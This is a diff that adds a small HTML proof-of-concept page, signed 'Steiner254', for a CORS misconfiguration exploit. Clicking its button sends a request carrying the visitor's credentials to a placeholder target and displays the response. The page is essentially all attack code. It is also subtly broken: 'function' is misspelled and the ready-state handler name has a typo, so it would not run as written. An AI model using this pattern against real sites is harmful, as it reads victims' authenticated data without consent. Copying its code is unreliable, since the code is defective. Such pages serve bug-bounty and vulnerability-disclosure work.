@@ -1,0 +1,24 @@
+<html>
+  <head>
+    <script>
+fucntion cors(){
+var xhttp = new XMLHttpRequest();
+xhttp.onreadstatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+document.getElementById("emo").innerHTML = alert(this.responseText);
+}
+};
+xhttp.open("GET", "https://target.com/", true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+    </script>
+  </head>
+ <body>
+<center>
+<h2> CORS POC Exploit By Steiner254 </h2>
+<div id="bugpoc">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+</body>
+</html>
